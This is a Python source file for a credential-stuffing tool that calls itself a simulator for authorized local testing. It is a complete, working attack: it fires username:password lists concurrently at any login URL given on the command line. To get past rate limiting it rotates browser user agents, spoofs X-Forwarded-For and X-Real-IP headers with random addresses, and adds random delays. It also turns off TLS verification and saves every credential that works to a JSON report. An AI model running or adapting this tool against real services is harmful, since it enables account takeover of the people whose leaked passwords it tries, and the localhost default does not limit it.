"""
Credential stuffing simulator (authorized local testing only).
"""

from __future__ import annotations

import argparse
import asyncio
import json
import random
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import List

import aiohttp
from colorama import Fore, Style, init

init(autoreset=True)


DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_5) AppleWebKit/605.1.15 Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
]


@dataclass(slots=True)
class Credential:
    username: str
    password: str


@dataclass(slots=True)
class AttemptResult:
    username: str
    password: str
    status: str
    http_status: int | None
    response_snippet: str
    user_agent: str
    spoofed_ip: str
    latency_ms: int
    timestamp_utc: str


@dataclass(slots=True)
class AttackConfig:
    url: str
    credentials_file: Path
    concurrency: int
    timeout_seconds: int
    min_delay: float
    max_delay: float
    success_pattern: str
    reports_dir: Path


class AttackEngine:
    def __init__(self, config: AttackConfig) -> None:
        self.config = config
        self.credentials: List[Credential] = []
        self.results: List[AttemptResult] = []
        self.successful_logins: List[AttemptResult] = []
        self.failed_attempts = 0
        self.error_attempts = 0
        self._lock = asyncio.Lock()

    def load_credentials(self) -> None:
        if not self.config.credentials_file.exists():
            raise FileNotFoundError(f"Credentials file not found: {self.config.credentials_file}")

        loaded: list[Credential] = []
        with self.config.credentials_file.open("r", encoding="utf-8") as handle:
            for idx, line in enumerate(handle, start=1):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    raise ValueError(
                        f"Invalid credentials format at line {idx}. Expected username:password"
                    )
                username, password = line.split(":", 1)
                loaded.append(Credential(username=username.strip(), password=password.strip()))

        if not loaded:
            raise ValueError("No valid credentials were loaded.")

        self.credentials = loaded
        print(f"{Fore.CYAN}Loaded {len(self.credentials)} credentials.")

    @staticmethod
    def _random_ip() -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    @staticmethod
    def _now_utc() -> str:
        return datetime.now(timezone.utc).isoformat(timespec="seconds")

    async def _attempt_login(
        self,
        session: aiohttp.ClientSession,
        semaphore: asyncio.Semaphore,
        credential: Credential,
        index: int,
        total: int,
    ) -> None:
        async with semaphore:
            await asyncio.sleep(random.uniform(self.config.min_delay, self.config.max_delay))

            user_agent = random.choice(DEFAULT_USER_AGENTS)
            spoofed_ip = self._random_ip()
            headers = {
                "User-Agent": user_agent,
                "X-Forwarded-For": spoofed_ip,
                "X-Real-IP": spoofed_ip,
            }
            payload = {"username": credential.username, "password": credential.password}

            start = time.perf_counter()
            status: str
            http_status: int | None = None
            response_snippet = ""

            try:
                async with session.post(self.config.url, data=payload, headers=headers) as response:
                    http_status = response.status
                    response_text = (await response.text()).strip()
                    response_snippet = response_text[:120]
                    if self.config.success_pattern.lower() in response_text.lower():
                        status = "success"
                    else:
                        status = "failed"
            except asyncio.TimeoutError:
                status = "timeout"
                response_snippet = "Request timed out"
            except aiohttp.ClientError as exc:
                status = "error"
                response_snippet = str(exc)[:120]

            latency_ms = int((time.perf_counter() - start) * 1000)
            result = AttemptResult(
                username=credential.username,
                password=credential.password,
                status=status,
                http_status=http_status,
                response_snippet=response_snippet,
                user_agent=user_agent,
                spoofed_ip=spoofed_ip,
                latency_ms=latency_ms,
                timestamp_utc=self._now_utc(),
            )

            async with self._lock:
                self.results.append(result)
                if status == "success":
                    self.successful_logins.append(result)
                    color = Fore.GREEN
                elif status == "failed":
                    self.failed_attempts += 1
                    color = Fore.YELLOW
                else:
                    self.error_attempts += 1
                    color = Fore.RED

                print(
                    f"{color}[{index}/{total}] {credential.username}:{credential.password} -> "
                    f"{status.upper()} (HTTP {http_status}, {latency_ms}ms)"
                )

    async def run(self) -> None:
        self.load_credentials()

        timeout = aiohttp.ClientTimeout(total=self.config.timeout_seconds)
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        semaphore = asyncio.Semaphore(self.config.concurrency)

        print(f"{Fore.CYAN}Starting attack simulation against {self.config.url}")
        print(
            f"{Fore.CYAN}Concurrency={self.config.concurrency} | "
            f"Delay={self.config.min_delay:.2f}-{self.config.max_delay:.2f}s | "
            f"Timeout={self.config.timeout_seconds}s"
        )

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = [
                asyncio.create_task(
                    self._attempt_login(
                        session=session,
                        semaphore=semaphore,
                        credential=cred,
                        index=index,
                        total=len(self.credentials),
                    )
                )
                for index, cred in enumerate(self.credentials, start=1)
            ]
            await asyncio.gather(*tasks)

        self._print_summary()
        self._write_report()

    def _print_summary(self) -> None:
        total = len(self.results)
        success_count = len(self.successful_logins)
        print("\n" + "=" * 64)
        print(f"{Fore.CYAN}Attack Summary")
        print("=" * 64)
        print(f"Total Attempts   : {total}")
        print(f"{Fore.GREEN}Successful Logins: {success_count}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Failed Attempts  : {self.failed_attempts}{Style.RESET_ALL}")
        print(f"{Fore.RED}Errors/Timeouts  : {self.error_attempts}{Style.RESET_ALL}")

        if success_count:
            print(f"\n{Fore.GREEN}Discovered Valid Credentials:")
            for attempt in self.successful_logins:
                print(f"  - {attempt.username}:{attempt.password}")

    def _write_report(self) -> None:
        self.config.reports_dir.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        report_path = self.config.reports_dir / f"attack_report_{timestamp}.json"

        report_data = {
            "meta": {
                "generated_at_utc": self._now_utc(),
                "target_url": self.config.url,
                "credentials_file": str(self.config.credentials_file),
                "total_credentials": len(self.credentials),
                "concurrency": self.config.concurrency,
                "delay_range_seconds": [self.config.min_delay, self.config.max_delay],
                "timeout_seconds": self.config.timeout_seconds,
                "success_pattern": self.config.success_pattern,
            },
            "summary": {
                "total_attempts": len(self.results),
                "successful_logins": len(self.successful_logins),
                "failed_attempts": self.failed_attempts,
                "errors_or_timeouts": self.error_attempts,
            },
            "successful_credentials": [
                {"username": item.username, "password": item.password}
                for item in self.successful_logins
            ],
            "attempts": [asdict(item) for item in self.results],
        }

        with report_path.open("w", encoding="utf-8") as handle:
            json.dump(report_data, handle, indent=2)

        print(f"\n{Fore.CYAN}Saved report: {report_path}")


def parse_args() -> argparse.Namespace:
    script_dir = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(
        description="Credential stuffing attack simulator for authorized local environments."
    )
    parser.add_argument(
        "--url",
        default="http://localhost:5000/login",
        help="Target login endpoint URL (default: http://localhost:5000/login)",
    )
    parser.add_argument(
        "--credentials",
        default=str(script_dir / "credentials.txt"),
        help="Path to credentials file (default: credentials.txt)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=10,
        help="Maximum concurrent requests (default: 10)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=8,
        help="Request timeout in seconds (default: 8)",
    )
    parser.add_argument(
        "--min-delay",
        type=float,
        default=0.10,
        help="Minimum randomized delay between attempts (default: 0.10)",
    )
    parser.add_argument(
        "--max-delay",
        type=float,
        default=0.60,
        help="Maximum randomized delay between attempts (default: 0.60)",
    )
    parser.add_argument(
        "--success-pattern",
        default="Login Successful",
        help='Case-insensitive response text indicating success (default: "Login Successful")',
    )
    parser.add_argument(
        "--reports-dir",
        default=str(script_dir / "reports"),
        help="Directory for JSON attack reports (default: reports)",
    )
    return parser.parse_args()


def build_config(args: argparse.Namespace) -> AttackConfig:
    if args.concurrency < 1:
        raise ValueError("--concurrency must be >= 1")
    if args.timeout < 1:
        raise ValueError("--timeout must be >= 1")
    if args.min_delay < 0 or args.max_delay < 0:
        raise ValueError("--min-delay and --max-delay must be >= 0")
    if args.min_delay > args.max_delay:
        raise ValueError("--min-delay cannot be greater than --max-delay")

    credentials_path = Path(args.credentials).expanduser().resolve()
    reports_path = Path(args.reports_dir).expanduser().resolve()

    return AttackConfig(
        url=args.url,
        credentials_file=credentials_path,
        concurrency=args.concurrency,
        timeout_seconds=args.timeout,
        min_delay=args.min_delay,
        max_delay=args.max_delay,
        success_pattern=args.success_pattern,
        reports_dir=reports_path,
    )


async def main() -> None:
    args = parse_args()
    config = build_config(args)
    engine = AttackEngine(config)
    await engine.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (ValueError, FileNotFoundError) as exc:
        print(f"{Fore.RED}Configuration error: {exc}")
